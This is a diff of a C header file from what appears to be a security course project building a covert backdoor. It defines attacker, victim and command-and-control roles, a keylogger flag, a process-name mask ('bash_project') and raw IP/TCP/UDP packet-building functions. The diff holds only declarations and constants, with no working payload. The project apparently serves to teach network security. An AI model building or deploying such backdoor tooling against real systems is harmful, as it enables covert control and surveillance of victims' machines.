@@ -43,57 +43,19 @@
 #include <sys/wait.h>
 #include <unistd.h>
 #include "extern.h"
+#include "linkedlist.h"
+#include "options.h"
 
-#define DEFAULT_TCP_PORT 52000
-#define DEFAULT_UDP_PORT 53000
-#define VICTIM_PORT 54000
-#define CNC_PORT 55000
 
-#define DEFAULT_COUNT 10000
-#define S_ARR_SIZE 64
-#define OUTPUT_SIZE 20000
 #define RECEIVE_SIZE 256
-#define SEND_SIZE 28
+#define UDP_SEND_SIZE 28
+#define TCP_SEND_SIZE 40
 #define BACKLOG 5
 #define TRUE 1
 #define FALSE 0
 #define MASK "bash_project"
 #define QUIT "quit"
 
-
-struct options_attacker {
-    char victim_ip[INET_ADDRSTRLEN];
-    char my_ip[INET_ADDRSTRLEN];
-    char cnc_ip[INET_ADDRSTRLEN];
-    char victim_instruction[64];
-    char target_directory[64];
-    int tcp_socket;
-    int udp_socket;
-    int cnc_socket;
-    bool cnc;
-};
-
-
-struct options_victim {
-    char attacker_ip[INET_ADDRSTRLEN];
-    char my_ip[INET_ADDRSTRLEN];
-    char cnc_ip[INET_ADDRSTRLEN];
-    int victim_udp_socket;
-    int victim_tcp_socket;
-    int cnc_socket;
-    int attacker_socket;
-    uint16_t attacker_port;
-    char received_buffer[S_ARR_SIZE];
-    char instruction[S_ARR_SIZE];
-    char sending_buffer[OUTPUT_SIZE];
-    char target_directory[64];
-    int file_count;
-    struct sockaddr_in cnc_addr;
-    bool ip_flag;
-    bool keylogger;
-    bool cnc;
-    bool target;
-};
 
 
 void check_root_user(void);
@@ -105,6 +67,9 @@ _Noreturn void fatal_message(const char *file, const char *func, size_t line, co
 unsigned int host_convert(char *hostname);
 uint16_t calculate_checksum(void *header, int header_size);
 uint16_t generate_random_port(void);
-
+void create_socket(void *arg, char flag, char protocol, char* ip, uint16_t port);
+unsigned short create_udp_header(struct udphdr* uh, uint16_t sport, uint16_t dport);
+unsigned short create_tcp_header(struct tcphdr* th, uint16_t sport, uint16_t dport);
+unsigned short create_ip_header(struct iphdr* ih, void *arg, char flag, char c, char protocol);
 
 #endif //COMP8505_PROJECT_COMMON_H
